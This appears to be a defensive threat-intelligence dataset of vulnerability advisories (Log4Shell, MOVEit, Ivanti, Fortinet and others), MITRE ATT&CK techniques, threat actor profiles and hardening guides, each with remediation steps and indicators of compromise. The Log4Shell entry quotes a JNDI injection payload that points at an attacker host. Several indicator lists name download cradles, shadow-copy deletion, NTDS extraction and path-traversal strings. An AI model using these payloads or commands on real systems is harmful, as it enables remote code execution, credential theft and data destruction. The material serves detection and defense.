title: XZ Utils Backdoor — Supply Chain Compromise
description: A sophisticated backdoor was planted in XZ Utils versions 5.6.0 and 5.6.1 through a multi-year social engineering campaign. The malicious code was hidden in test files and activated during the build process, allowing remote code execution through SSH on affected systems using systemd-integrated OpenSSH.
remediation: Immediately downgrade XZ Utils to version 5.4.x or earlier. Audit systems running 5.6.0 or 5.6.1 for indicators of compromise. Verify package integrity using known-good checksums.
ioc_indicators: liblzma.so with modified CRC functions
Unauthorized SSH connections on port 22

title: Log4Shell — Apache Log4j Remote Code Execution
description: A critical vulnerability in Apache Log4j 2.x allows remote code execution via crafted log messages containing JNDI lookup strings. Attackers can execute arbitrary code by sending specially crafted strings like ${jndi:ldap://attacker.com/exploit} to any input that gets logged.
remediation: Upgrade to Log4j 2.17.1 or later. As immediate mitigation, set log4j2.formatMsgNoLookups=true or remove JndiLookup class from the classpath.
ioc_indicators: ${jndi:ldap:// patterns in logs
${jndi:rmi:// patterns
Outbound LDAP connections to unusual IPs

title: MOVEit Transfer SQL Injection — Mass Data Exfiltration
description: A critical SQL injection vulnerability in Progress MOVEit Transfer allows unauthenticated attackers to access the database and execute arbitrary code. Cl0p ransomware group exploited this zero-day to exfiltrate data from thousands of organizations worldwide.
remediation: Apply MOVEit Transfer patches immediately. Review access logs for unauthorized API calls to /moveitisapi/moveitisapi.dll. Audit file transfer logs for anomalous bulk downloads.
ioc_indicators: human2.aspx webshell
Unexpected .cmdline files
Large outbound data transfers from MOVEit servers

title: Citrix Bleed — NetScaler Session Hijacking
description: A buffer overflow in Citrix NetScaler ADC and Gateway allows unauthenticated attackers to extract sensitive information from device memory, including valid session tokens. Attackers use stolen session cookies to bypass authentication and MFA, gaining full access to internal networks.
remediation: Patch to the latest NetScaler firmware. Kill all active and persistent sessions after patching — the patch alone does not invalidate stolen tokens. Rotate all credentials accessed through the gateway.
ioc_indicators: Large HTTP responses from /oauth/idp/.well-known/openid-configuration
Session token reuse from different source IPs
Unusual VPN logins post-patch

title: Atlassian Confluence — Broken Access Control to RCE
description: A critical broken access control vulnerability in Atlassian Confluence Data Center and Server allows unauthenticated attackers to create administrator accounts by accessing the setup endpoint. Nation-state actors actively exploited this to gain persistent access to corporate wiki instances.
remediation: Upgrade Confluence immediately. Block access to /setup/* endpoints at the network level. Audit admin accounts for unauthorized additions.
ioc_indicators: Requests to /setup/setupadministrator.action
New admin accounts created outside normal provisioning
Outbound connections from Confluence servers

title: Ivanti Connect Secure — Authentication Bypass Chain
description: A command injection vulnerability in Ivanti Connect Secure and Policy Secure gateways, chained with CVE-2023-46805 authentication bypass, allows unauthenticated remote code execution. Chinese state-sponsored actors (UNC5221) deployed custom malware including ZIPLINE and THINSPOOL backdoors.
remediation: Apply Ivanti patches. Perform factory reset before patching — attackers persist through standard upgrades. Run Ivanti's Integrity Checker Tool. Review for lateral movement from compromised VPN appliances.
ioc_indicators: Modified compcheck.cgi files
ZIPLINE passive backdoor on port 443
THINSPOOL dropper in /tmp/

title: VMware vCenter Server — Unauthenticated RCE via File Upload
description: An unauthenticated file upload vulnerability in VMware vCenter Server allows attackers to upload a webshell to an internet-facing server and execute arbitrary commands with vCenter service account privileges, leading to full infrastructure compromise.
remediation: Patch vCenter Server immediately. Restrict vCenter management interfaces to dedicated management networks — never expose to the internet. Audit for unauthorized files in web directories.
ioc_indicators: Unexpected .jsp files in vCenter web directories
POST requests to /ui/vropspluginui/rest/services/uploadova
New processes spawned by vsphere-client

title: FortiManager — FortiJump Authentication Bypass
description: A missing authentication vulnerability in FortiManager's FGFM daemon allows unauthenticated attackers to execute arbitrary code by sending crafted requests to the management interface. Threat actors exploited this to register rogue FortiGate devices and extract configuration data including credentials.
remediation: Upgrade FortiManager to patched versions. Restrict FGFM access to known FortiGate IP addresses only. Audit registered devices for unauthorized additions. Rotate all managed device credentials.
ioc_indicators: Unauthorized device registrations in FortiManager
Rogue /tmp/.tm files
Unexpected outbound connections from FortiManager on port 541

title: Microsoft Office — HTML RCE via Storm-0978
description: A remote code execution vulnerability in Microsoft Windows and Office products exploited via specially crafted Office documents. Russian threat actor Storm-0978 used this in spear-phishing campaigns targeting NATO summit attendees with documents containing Ukrainian World Congress lures.
remediation: Apply Microsoft security updates. Block Office applications from creating child processes via ASR rules. Implement MOTW enforcement for all downloaded Office documents.
ioc_indicators: Office documents with embedded OLE objects making HTTP requests
Suspicious .docx files with afchunk.rtf payloads
DNS queries to attacker C2 domains

title: Palo Alto PAN-OS — Management Interface Authentication Bypass
description: An authentication bypass in Palo Alto Networks PAN-OS management web interface allows unauthenticated attackers to gain administrator privileges. Chained with CVE-2024-9474 for privilege escalation to root, enabling deployment of webshells, cryptominers, and proxy tools on compromised firewalls.
remediation: Restrict management interface access to trusted internal IPs immediately. Apply PAN-OS patches. Never expose firewall management interfaces to the internet. Audit for unauthorized admin accounts and configuration changes.
ioc_indicators: Unexpected PHP files in PAN-OS web directories
Management interface accessible from public internet
Configuration exports to unknown destinations

title: MITRE ATT&CK T1566 — Phishing: Spearphishing Attachment
description: Adversaries send spearphishing emails with malicious attachments to gain initial access. Common attachment types include Office documents with macros, PDFs with embedded scripts, and archive files containing executables. This remains the most common initial access vector across all threat actor categories.
remediation: Implement email filtering with attachment sandboxing. Disable Office macro execution for internet-sourced documents via Group Policy. Deploy endpoint detection for suspicious process trees spawned from Office applications. Conduct regular phishing awareness training.
ioc_indicators: Office documents with auto-executing macros
Password-protected archives in emails
Documents triggering PowerShell or cmd.exe

title: MITRE ATT&CK T1059.001 — PowerShell Execution
description: Adversaries abuse PowerShell for command execution, scripting, and living-off-the-land tactics. PowerShell is used across the kill chain — from initial access payloads to lateral movement and data exfiltration. Its deep integration with Windows APIs and .NET framework makes it extremely versatile for attackers.
remediation: Enable PowerShell ScriptBlock and Module logging. Deploy Constrained Language Mode for non-admin users. Use AppLocker or WDAC to restrict PowerShell execution. Monitor for encoded commands (-enc flag) and download cradles (IEX/Invoke-Expression).
ioc_indicators: powershell.exe -enc (Base64 encoded commands)
Invoke-Expression with Net.WebClient
PowerShell loading assemblies via reflection
ScriptBlock logs with obfuscated content

title: MITRE ATT&CK T1110 — Brute Force: Password Spraying
description: Adversaries attempt a single commonly used password against many accounts before moving to the next password, avoiding account lockout thresholds. This technique is highly effective against organizations with weak password policies and no MFA, particularly targeting cloud identity providers and VPN endpoints.
remediation: Enforce MFA on all externally-facing authentication endpoints. Implement smart lockout policies that detect distributed spray patterns. Deploy conditional access policies requiring compliant devices. Monitor for distributed authentication failures across multiple accounts from limited source IPs.
ioc_indicators: Multiple failed logins across many accounts from few IPs
Authentication attempts at regular intervals
Spike in AADSTS error codes 50053/50126
Login attempts outside business hours from unusual geolocations

title: MITRE ATT&CK T1562.001 — Disable or Modify Security Tools
description: Adversaries disable or modify security tools to evade detection. Common methods include killing EDR processes, unloading kernel drivers, modifying Windows Defender exclusions, and using vulnerable drivers (BYOVD) to disable security software from kernel mode. This is often one of the first post-exploitation actions.
remediation: Enable tamper protection on all endpoint security products. Deploy kernel-level protections against BYOVD attacks. Monitor for security service state changes and unexpected driver loads. Implement alerting on Windows Defender exclusion modifications.
ioc_indicators: Security service stopped or disabled
New kernel drivers loaded from temp directories
PowerShell commands adding Defender exclusions
Vulnerable drivers dropped to disk (e.g., RTCore64.sys)

title: MITRE ATT&CK T1486 — Data Encrypted for Impact (Ransomware)
description: Adversaries encrypt data on target systems to interrupt availability and facilitate ransom demands. Modern ransomware operations use double extortion — encrypting data while simultaneously exfiltrating it for public exposure. Average dwell time before encryption deployment has decreased to under 24 hours in many cases.
remediation: Maintain offline, immutable backups tested regularly. Segment networks to limit lateral movement. Deploy canary files to detect early-stage encryption activity. Implement robust EDR with ransomware-specific behavioral detection. Develop and test incident response playbooks.
ioc_indicators: Mass file modification events across network shares
Volume shadow copy deletion (vssadmin delete shadows)
Ransom notes in affected directories
Unusual process writing to many files rapidly

title: ConnectWise ScreenConnect — Authentication Bypass
description: A critical authentication bypass in ConnectWise ScreenConnect allows unauthenticated attackers to create admin accounts by accessing the setup wizard on already-configured instances. Multiple threat actors including ransomware groups rapidly exploited this for initial access to managed service providers and their downstream clients.
remediation: Update ScreenConnect to version 23.9.8 or later immediately. Cloud-hosted instances were auto-patched. For on-premises, audit admin accounts and review session history for unauthorized access.
ioc_indicators: Access to /SetupWizard.aspx on configured instances
New admin accounts created post-deployment
Unexpected remote sessions initiated from ScreenConnect

title: Fortinet FortiOS — SSL VPN Heap Overflow RCE
description: A heap-based buffer overflow in FortiOS SSL VPN allows unauthenticated remote code execution via crafted requests. Pre-authentication exploitation means no credentials are required. Actively exploited by Chinese state-sponsored actors and ransomware groups targeting government and critical infrastructure.
remediation: Upgrade FortiOS immediately. If SSL VPN cannot be patched, disable it as a temporary measure. Audit VPN logs for anomalous connections. Consider migrating to zero-trust network access solutions.
ioc_indicators: Crash logs in FortiOS related to SSL VPN
Unexpected processes on FortiGate appliances
Modified filesystem on FortiOS

title: F5 BIG-IP — iControl REST Authentication Bypass
description: An authentication bypass in F5 BIG-IP iControl REST API allows unauthenticated attackers to execute arbitrary system commands by manipulating the X-F5-Auth-Token header and Connection header. Full root-level command execution on BIG-IP appliances sitting in front of critical applications.
remediation: Patch BIG-IP immediately. Block iControl REST access from untrusted networks. As temporary mitigation, restrict management access to trusted IPs via self-IP port lockdown.
ioc_indicators: Requests to /mgmt/tm/util/bash with manipulated auth headers
Unexpected cron jobs or new accounts on BIG-IP
Outbound connections from BIG-IP management plane

title: GoAnywhere MFT — Pre-Auth Remote Code Execution
description: A pre-authentication command injection vulnerability in Fortra GoAnywhere MFT admin console. Cl0p ransomware group exploited this zero-day across 130+ organizations in a mass data theft campaign, exfiltrating files via the managed file transfer platform before deploying ransomware in some cases.
remediation: Patch GoAnywhere MFT immediately. Disable the admin console's internet exposure. Audit file transfer logs for unauthorized downloads. Implement network segmentation around MFT infrastructure.
ioc_indicators: Suspicious License Response Servlet requests
Unexpected .jsp files in GoAnywhere web directories
Bulk file access patterns in transfer logs

title: Microsoft Exchange ProxyLogon — SSRF to RCE Chain
description: A server-side request forgery vulnerability in Microsoft Exchange Server that, when chained with CVE-2021-27065, allows unauthenticated attackers to write webshells and execute arbitrary code. HAFNIUM and multiple other threat groups exploited this to compromise tens of thousands of Exchange servers worldwide.
remediation: Apply Exchange cumulative updates. Run Microsoft's EOMT mitigation tool as interim fix. Scan for webshells in Exchange directories. Investigate for lateral movement from compromised Exchange servers into Active Directory.
ioc_indicators: Webshells in C:\inetpub\wwwroot\aspnet_client\
POST requests to /owa/auth/x.js or similar
Unexpected w3wp.exe child processes
LSASS memory dumps from Exchange servers

title: Hardening — SSH Configuration Best Practices
description: SSH is a primary target for both automated attacks and sophisticated threat actors. Default configurations often allow password authentication, root login, and outdated key exchange algorithms. Properly hardening SSH significantly reduces attack surface for remote access compromise.
remediation: Disable password authentication (PasswordAuthentication no). Disable root login (PermitRootLogin no). Use Ed25519 keys only. Restrict users via AllowUsers/AllowGroups. Enable key-based authentication only. Set MaxAuthTries to 3. Use fail2ban or similar for brute-force protection. Consider port knocking or VPN-only SSH access for critical systems.
ioc_indicators: Failed SSH logins from diverse IPs
Successful root logins via SSH
SSH connections using deprecated algorithms

title: Hardening — Kubernetes Cluster Security
description: Kubernetes misconfigurations are among the most common cloud security findings. Exposed API servers, overly permissive RBAC, privileged containers, and missing network policies create pathways for container escape, lateral movement, and cluster takeover.
remediation: Restrict API server access to authorized networks. Implement least-privilege RBAC — no cluster-admin for workloads. Enforce Pod Security Standards (restricted profile). Deploy network policies to segment pod-to-pod communication. Enable audit logging. Use admission controllers to prevent privileged containers. Scan images for vulnerabilities before deployment.
ioc_indicators: Anonymous authentication to kube-apiserver
Pods running as root or with hostPID/hostNetwork
Unexpected ClusterRoleBindings granting cluster-admin
Container escape indicators in audit logs

title: Hardening — Cloud IAM Least Privilege
description: Overly permissive IAM policies in cloud environments (AWS, Azure, GCP) are the root cause of most cloud breaches. Wildcard permissions, long-lived access keys, and missing MFA on privileged accounts enable attackers to escalate from a single compromised credential to full cloud account takeover.
remediation: Implement least-privilege IAM using policy analysis tools. Remove all wildcard (*) resource permissions. Enforce MFA on all human IAM users. Rotate access keys every 90 days and prefer short-lived role-based credentials. Enable CloudTrail/Cloud Audit logging for all regions. Use SCPs or organization policies to set guardrails.
ioc_indicators: IAM policies with Action: * and Resource: *
Access key usage from unusual IPs or regions
Privilege escalation through iam:PassRole or sts:AssumeRole chains
CloudTrail logging disabled or modified

title: regreSSHion — OpenSSH Remote Code Execution
description: A signal handler race condition in OpenSSH server (sshd) allows unauthenticated remote code execution as root on glibc-based Linux systems. This is a regression of the previously fixed CVE-2006-5051. Exploitation requires winning a race condition which takes ~10,000 attempts averaging 6-8 hours, but is deterministic given enough time.
remediation: Upgrade OpenSSH to 9.8p1 or later. As temporary mitigation, set LoginGraceTime to 0 in sshd_config (note: this makes the server vulnerable to connection exhaustion DoS). Restrict SSH access via firewall rules to minimize exposure.
ioc_indicators: High volume of SSH connection attempts followed by disconnects
sshd crashes in system logs
SIGALRM handling anomalies in OpenSSH logs

title: PHP CGI Argument Injection on Windows
description: An argument injection vulnerability in PHP-CGI on Windows when using certain code pages (e.g., Chinese/Japanese). Attackers can pass command-line arguments to the PHP binary through URL query strings, achieving remote code execution. Widely exploited in the wild within days of disclosure, primarily targeting Japanese organizations.
remediation: Update PHP to patched versions (8.3.8+, 8.2.20+, 8.1.29+). Migrate from PHP-CGI to PHP-FPM. If using Apache on Windows with PHP-CGI, apply URL rewrite rules to filter malicious characters.
ioc_indicators: Requests with soft hyphen (0xAD) in query strings
php-cgi.exe spawning unexpected child processes
POST requests to PHP endpoints with -d or -r arguments

title: Threat Actor Profile: Scattered Spider (UNC3944)
description: Scattered Spider is a financially motivated threat group known for sophisticated social engineering attacks against help desks and IT support staff. They specialize in SIM swapping, MFA fatigue attacks, and impersonating employees to gain initial access. Notable targets include MGM Resorts, Caesars Entertainment, and multiple technology companies. Members are primarily English-speaking young adults.
remediation: Implement phishing-resistant MFA (FIDO2/WebAuthn). Train help desk staff to verify identity through callback procedures. Implement number matching for push-based MFA. Monitor for anomalous Okta/Azure AD admin activity. Deploy behavioral analytics to detect account takeover patterns.
ioc_indicators: MFA fatigue — repeated push notifications
Help desk calls requesting password resets
Okta admin console access from residential VPN IPs
Azure AD conditional access policy modifications

title: Threat Actor Profile: Volt Typhoon
description: Volt Typhoon is a Chinese state-sponsored threat actor targeting US critical infrastructure including communications, energy, transportation, and water sectors. They exclusively use living-off-the-land techniques, avoiding custom malware to blend in with normal administrative activity. Their goal appears to be pre-positioning for potential disruptive attacks rather than traditional espionage.
remediation: Implement robust logging for all network devices, especially SOHO routers and edge appliances. Baseline normal administrative tool usage. Monitor for anomalous use of wmic, ntdsutil, netsh, and PowerShell. Harden or replace end-of-life SOHO equipment. Segment OT networks from IT networks.
ioc_indicators: LOTL tool usage from unexpected sources
Compromised SOHO routers used as operational relay boxes
ntdsutil.exe used for Active Directory credential extraction
Scheduled tasks created via wmic

title: Ivanti Connect Secure — Stack Buffer Overflow
description: A stack-based buffer overflow in Ivanti Connect Secure versions prior to 22.7R2.5 allows unauthenticated remote code execution. Exploited as a zero-day by Chinese-linked threat actors, who deployed the SPAWN ecosystem of malware including SPAWNANT installer, SPAWNMOLE tunneler, and SPAWNSNAIL SSH backdoor.
remediation: Apply Ivanti patches immediately. Run the Integrity Checker Tool. If compromise indicators found, perform factory reset. Monitor for persistence mechanisms that survive patching.
ioc_indicators: Modified Perl modules in Connect Secure
SPAWNANT installer modifying system daemons
Unexpected SSH listeners on non-standard ports
Web request logs showing buffer overflow patterns

title: Hardening — Active Directory Tier Model Implementation
description: Active Directory remains the primary identity infrastructure in most enterprises and is the target of virtually every domain-joined Windows attack. Implementing a tiered administration model separates administrative privileges across three tiers: Tier 0 (domain controllers and identity), Tier 1 (servers and applications), Tier 2 (workstations and devices). This prevents a single compromised admin account from reaching domain dominance.
remediation: Implement Privileged Access Workstations for Tier 0 admins. Deploy authentication policies and silos (Win Server 2012R2+). Separate Tier 0 admin accounts from daily-use accounts. Enable Protected Users security group for sensitive accounts. Deploy LAPS for local administrator passwords. Monitor for Golden Ticket and DCSync attacks.
ioc_indicators: Tier 0 credentials used from non-PAW machines
Kerberos TGT with abnormally long lifetimes (Golden Ticket)
DCSync replication requests from non-DC machines
NTDS.dit access or extraction attempts

title: Ivanti Policy Secure — Authentication Bypass via Path Traversal
description: An authentication bypass vulnerability in Ivanti Connect Secure and Policy Secure via path traversal allows remote attackers to access restricted resources without authentication. When chained with CVE-2024-21887 command injection, enables full unauthenticated remote code execution.
remediation: Apply vendor patches. Deploy Ivanti's XML mitigation as temporary workaround. Monitor ICS/IPS device integrity. Factory reset compromised devices before re-deployment.
ioc_indicators: Path traversal patterns in web logs (/api/v1/totp/user-backup-code/../../)
Web shells in device filesystem
Unexpected configuration exports

title: Hardening — DNS Security and Monitoring
description: DNS is often overlooked in security monitoring despite being used by malware for C2 communication, data exfiltration, and domain generation algorithm (DGA) based resilience. Over 90% of malware uses DNS at some point in its lifecycle. Securing DNS provides both defensive hardening and detection opportunities.
remediation: Deploy DNS filtering/security solutions (DNS sinkholing). Enable DNS query logging on all resolvers. Monitor for high-entropy domain names (DGA indicators). Block DNS over HTTPS/TLS to unauthorized resolvers. Implement response policy zones (RPZ) for threat intelligence. Monitor for DNS tunneling indicators (high query volume to single domains, large TXT records).
ioc_indicators: High-entropy subdomain queries
Unusually large DNS TXT record responses
High query volume to newly registered domains
DNS queries to known malicious domains

title: Fortinet FortiOS — Out-of-Bounds Write in SSL VPN
description: An out-of-bound write vulnerability in FortiOS SSL VPN allows unauthenticated attackers to execute arbitrary code via specially crafted HTTP requests. CISA added this to the Known Exploited Vulnerabilities catalog. This is the second critical SSL VPN vulnerability in FortiOS within 12 months.
remediation: Upgrade FortiOS to patched versions. If unable to patch, disable SSL VPN as workaround. Audit FortiGate filesystem integrity. Review VPN session logs for anomalies.
ioc_indicators: Anomalous HTTP requests to FortiOS SSL VPN endpoints
Crash logs on FortiGate appliances
Unauthorized filesystem modifications

title: Hardening — Email Authentication: DMARC, SPF, DKIM
description: Email spoofing remains a primary vector for phishing and business email compromise (BEC). Properly implementing DMARC, SPF, and DKIM prevents attackers from sending emails that appear to originate from your domain. Google and Yahoo now require DMARC for bulk senders.
remediation: Publish SPF records listing authorized mail servers. Configure DKIM signing on all outbound email. Implement DMARC starting with p=none for monitoring, advancing to p=quarantine and eventually p=reject. Use DMARC aggregate reports to identify unauthorized senders. Implement BIMI for visual brand verification in supported email clients.
ioc_indicators: DMARC failures in aggregate reports
Emails from your domain failing SPF alignment
Spoofed emails reported by recipients
DKIM signature failures on legitimate mail

title: FortiOS SSL VPN — Heap Buffer Overflow RCE
description: A heap-based buffer overflow in FortiOS SSL VPN allows unauthenticated remote code execution. Exploited as a zero-day by a suspected Chinese-nexus threat actor who deployed custom implants on FortiGate devices. The implant persisted through firmware updates by modifying the device boot process.
remediation: Patch FortiOS immediately. Verify device integrity using Fortinet's verification procedures. If compromise suspected, replace the device — firmware-level persistence may survive factory reset in some cases.
ioc_indicators: Unexpected files in /data/ directory on FortiGate
Modified boot scripts
Outbound connections to attacker infrastructure from FortiGate management plane

title: MITRE ATT&CK T1053.005 — Scheduled Task/Job for Persistence
description: Adversaries create scheduled tasks to establish persistence, escalate privileges, or execute payloads on a recurring basis. Windows Task Scheduler is commonly abused because it supports running tasks as SYSTEM, survives reboots, and can be configured remotely. Both commodity malware and APT groups rely heavily on this technique.
remediation: Monitor Task Scheduler event logs (Event ID 4698, 4699, 4700, 4702). Restrict who can create scheduled tasks via Group Policy. Audit existing scheduled tasks across the environment for anomalies. Block schtasks.exe execution for standard users via AppLocker.
ioc_indicators: New scheduled tasks with suspicious commands
Tasks running PowerShell, cmd, or mshta
Tasks configured to run as SYSTEM from non-admin context
Remote task creation via RPC

title: HTTP/2 Rapid Reset — DDoS Attack Vector
description: A novel DDoS technique exploiting HTTP/2 stream multiplexing by rapidly sending RST_STREAM frames after opening new streams. This allows attackers to generate enormous request volumes with minimal client resources. Google observed attacks exceeding 398 million requests per second using this method.
remediation: Update HTTP/2-capable web servers and load balancers (nginx, Apache, Envoy, etc.). Implement rate limiting on HTTP/2 stream creation. Configure maximum concurrent streams per connection. Deploy DDoS mitigation services capable of detecting rapid reset patterns.
ioc_indicators: Extremely high HTTP/2 stream creation rates
Rapid RST_STREAM frames following HEADERS frames
Disproportionate server resource consumption relative to request completion rate
source: NVD + Google/Cloudflare/AWS joint advisory + ArcX analysis

title: Hardening — Container Image Security Pipeline
description: Container images built from untrusted or unscanned base images are a growing supply chain risk. Attackers inject cryptocurrency miners, backdoors, and credential stealers into popular images on public registries. Over 1,600 malicious Docker Hub images were identified in a single research study.
remediation: Use only official or verified base images. Implement image scanning in CI/CD pipelines (Trivy, Grype, Snyk). Deploy admission controllers to block unscanned images. Sign images with cosign/Notation. Use distroless or minimal base images to reduce attack surface. Never store secrets in image layers — use runtime secret injection.
ioc_indicators: Images with embedded cryptocurrency miners
Layers containing SSH keys or credentials
Base images from unverified publishers
Images with setuid binaries in unexpected locations

title: JetBrains TeamCity — Authentication Bypass to RCE
description: A critical authentication bypass in JetBrains TeamCity allows unauthenticated attackers to access any HTTP endpoint by manipulating the request path. Attackers create admin accounts, modify build configurations, and inject malicious code into CI/CD pipelines, potentially compromising all software built by the affected server.
remediation: Update TeamCity to 2023.11.4 or later immediately. Audit admin accounts for unauthorized additions. Review build configurations for injected scripts. Inspect build artifacts for tampering. Consider rotating all credentials stored in TeamCity.
ioc_indicators: Requests with /res/../ path traversal patterns
New admin accounts in TeamCity
Modified build steps or configurations
Unauthorized access to build artifacts

title: MITRE ATT&CK T1071.001 — Web Protocols for C2
description: Adversaries use HTTP/HTTPS for command-and-control communications to blend in with legitimate web traffic. Modern C2 frameworks like Cobalt Strike, Sliver, and Mythic use domain fronting, malleable profiles, and encrypted HTTPS to evade network-based detection. Traffic analysis alone is often insufficient for detection.
remediation: Deploy TLS inspection on egress traffic where legally and technically feasible. Implement DNS-based threat intelligence. Use JA3/JA3S fingerprinting to identify known C2 frameworks. Monitor for beaconing patterns — regular interval communications to single destinations. Block known C2 framework default certificates.
ioc_indicators: Regular-interval HTTPS connections to single hosts
JA3 fingerprints matching Cobalt Strike or other frameworks
HTTP requests with abnormal header patterns
Domain fronting via CDN services

title: Hardening — Zero Trust Network Architecture Principles
description: Traditional perimeter-based security fails in modern environments with cloud workloads, remote workers, and mobile devices. Zero Trust assumes breach and verifies every access request regardless of network location. NIST SP 800-207 defines the foundational architecture: continuous verification, least-privilege access, and micro-segmentation.
remediation: Implement strong identity verification with MFA for all users. Deploy device health attestation as an access condition. Use micro-segmentation to limit lateral movement. Implement just-in-time and just-enough-access (JIT/JEA) for privileged operations. Log and analyze all access for anomaly detection. Encrypt all data in transit regardless of network location.
ioc_indicators: Lateral movement between network segments
Access from non-compliant devices
Authentication from unusual locations or impossible travel
Privilege escalation attempts across trust boundaries
source: NIST SP 800-207 + CISA Zero Trust Maturity Model + ArcX analysis

title: FortiOS — Format String Vulnerability in fgfmd
description: A format string vulnerability in the FortiGate to FortiManager Protocol (FGFM) daemon allows remote unauthenticated attackers to execute arbitrary code. The vulnerability is in how the daemon processes externally controlled format strings. CISA added this to the Known Exploited Vulnerabilities catalog.
remediation: Update FortiOS to patched versions. As a workaround, restrict which IP addresses can reach the FGFM interface using local-in policies. Consider disabling FGFM if FortiManager integration is not required.
ioc_indicators: Exploitation attempts against TCP port 541 (FGFM)
Unexpected process execution on FortiGate
Modified FortiOS filesystem

title: MITRE ATT&CK T1003.003 — NTDS.dit Credential Extraction
description: Adversaries extract the NTDS.dit file from Active Directory domain controllers to obtain password hashes for all domain accounts. Methods include Volume Shadow Copy (vssadmin), ntdsutil, DCSync (mimikatz), and direct disk access. With the NTDS.dit and SYSTEM hive, attackers can perform offline cracking or pass-the-hash attacks against any domain account.
remediation: Protect domain controllers as Tier 0 assets. Monitor for Volume Shadow Copy creation on DCs. Detect DCSync by alerting on directory replication requests from non-DC sources. Implement Credential Guard on Windows 10/11 to protect cached credentials. Enforce strong password policies to resist offline cracking.
ioc_indicators: vssadmin create shadow on domain controllers
ntdsutil snapshot commands
Directory replication (DRS) requests from non-DC IPs
Large file copies from DC system volumes

title: Cleo File Transfer — Unauthenticated Remote Code Execution
description: An unrestricted file upload and download vulnerability in Cleo Harmony, VLTrader, and LexiCom file transfer products allows unauthenticated attackers to execute arbitrary code. Cl0p ransomware group exploited this zero-day following their pattern of targeting managed file transfer (MFT) solutions for mass data exfiltration.
remediation: Apply Cleo patches immediately. Place Cleo systems behind a firewall and restrict internet access. Monitor for unauthorized file uploads. Review autorun configurations for injected commands.
ioc_indicators: Unauthorized files in Cleo autorun directory
Suspicious .cmd or .bat files appearing in Cleo directories
Outbound data transfers to unknown destinations
Modified Cleo system configurations

title: Hardening — Web Application Firewall Deployment
description: Web Application Firewalls provide a critical defense layer against common web attacks including SQL injection, cross-site scripting, and remote code execution attempts. While not a replacement for secure coding practices, WAFs provide virtual patching capability and can block exploitation of zero-day vulnerabilities while patches are developed.
remediation: Deploy WAF in front of all internet-facing web applications. Start in detection/logging mode before enabling blocking. Configure custom rules for application-specific attack patterns. Regularly review and tune WAF rules to minimize false positives. Implement virtual patching rules for known vulnerabilities before application patches are available. Use managed rule sets (OWASP CRS) as a baseline.
ioc_indicators: WAF blocks indicating SQLi or XSS attempts
High volume of 403 responses from WAF
Requests with common attack patterns in parameters
Attempts to bypass WAF rules using encoding

title: Microsoft MSHTML — Remote Code Execution via Office Documents
description: A remote code execution vulnerability in Microsoft MSHTML engine allows attackers to craft malicious Office documents that execute code when opened. The attack uses ActiveX controls embedded in Office documents to download and execute payloads. Exploited in the wild before a patch was available.
remediation: Apply Microsoft security updates. Disable ActiveX controls in Office via Group Policy. Enable Protected View for all Office documents from external sources. Block Office from creating child processes using ASR rules.
ioc_indicators: Office documents containing CAB files with INF extension
MSHTML loading remote content from Office processes
ActiveX control instantiation from document context

title: MITRE ATT&CK T1027 — Obfuscated Files or Information
description: Adversaries obfuscate payloads, scripts, and configurations to evade signature-based detection. Common techniques include Base64 encoding, XOR encryption, string concatenation, variable substitution, and compression. PowerShell scripts, JavaScript droppers, and compiled binaries all employ obfuscation to bypass antivirus and EDR solutions.
remediation: Deploy AMSI (Antimalware Scan Interface) on Windows endpoints for runtime script analysis. Enable deep script block logging for PowerShell. Use behavioral detection rules rather than relying solely on signatures. Implement sandbox analysis for email attachments and downloaded files.
ioc_indicators: Base64-encoded PowerShell commands
High-entropy script content
String concatenation patterns in scripts
XOR-encoded payloads in script variables

title: Hardening — Network Segmentation Best Practices
description: Flat networks allow attackers to move laterally from any compromised endpoint to any other system. Proper network segmentation creates boundaries that limit blast radius, slow attackers, and create choke points for detection. This is one of the most impactful controls for reducing ransomware impact.
remediation: Segment by function: separate user workstations, servers, management interfaces, and IoT/OT. Implement VLANs with firewall rules between segments. Block direct workstation-to-workstation communication. Restrict management protocols (RDP, SSH, WinRM) to dedicated management VLANs. Deploy host-based firewalls as a secondary boundary.
ioc_indicators: Lateral movement across segment boundaries
Direct workstation-to-workstation connections on management ports
RDP or SMB connections from user segments to server segments without going through jump hosts

title: Palo Alto PAN-OS — GlobalProtect Command Injection
description: A command injection vulnerability in the GlobalProtect feature of PAN-OS allows unauthenticated attackers to execute arbitrary code with root privileges on the firewall. The vulnerability is in how the firewall processes session state data. State-sponsored actors exploited this zero-day to deploy backdoors and exfiltrate configuration data from Palo Alto firewalls.
remediation: Apply PAN-OS hotfixes. Enable Threat Prevention signatures as temporary mitigation. If compromised, perform factory reset and restore from known-good configuration backup. Rotate all credentials that may have been accessible from the firewall.
ioc_indicators: Unusual files in /opt/panlogs/ on PAN-OS
GlobalProtect log anomalies
Unexpected cron jobs on PAN-OS
Configuration exports to external hosts

title: Hardening — Incident Response Preparation Checklist
description: Organizations without tested incident response plans average 287 days to identify and contain a breach, versus 214 days for those with a dedicated IR team and tested plan. Preparation is the most impactful phase of the incident response lifecycle, yet most organizations only develop plans after their first major incident.
remediation: Develop and document an incident response plan with clear roles. Establish communication channels that work during compromise (out-of-band comms). Maintain an updated asset inventory. Pre-engage a digital forensics firm (retainer). Conduct tabletop exercises quarterly. Ensure logging covers all critical systems with adequate retention (90+ days). Document golden image recovery procedures. Practice full backup restoration annually.

title: Cisco IOS XE — Web UI Privilege Escalation
description: A critical privilege escalation vulnerability in the web UI of Cisco IOS XE allows unauthenticated attackers to create admin-level accounts. Over 40,000 Cisco devices were compromised within days of disclosure. Attackers chained this with CVE-2023-20273 for root-level command execution, deploying implants for persistent access.
remediation: Disable the HTTP/HTTPS server feature on IOS XE devices if not required. Apply Cisco patches. If the web UI must remain enabled, restrict access to trusted management networks. Audit for unauthorized local accounts.
ioc_indicators: New local accounts on IOS XE devices
Implant accessible via specific URI path
Unexpected configuration changes on network devices
